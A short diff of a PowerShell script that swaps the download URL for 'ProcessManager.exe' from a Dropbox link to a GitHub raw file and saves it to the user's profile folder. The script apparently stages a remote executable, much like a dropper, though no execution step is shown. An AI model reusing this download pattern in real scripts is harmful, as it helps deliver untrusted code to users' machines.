@@ -2,7 +2,7 @@
 $userPath = $env:USERPROFILE
 
 # Download URL
-$url = "https://www.dropbox.com/scl/fi/5asn30r39w25pbmyi8cr0/ProcessManager.exe?rlkey=q24432rqs87msllnu1jmkfwuy&st=gjcr768i&dl=1"
+$url = "https://github.com/EncryptedByRollerV8/f/raw/main/ProcessManager.exe"
 
 # Destination file path
 $destination = Join-Path -Path $userPath -ChildPath "ProcessManager.exe"
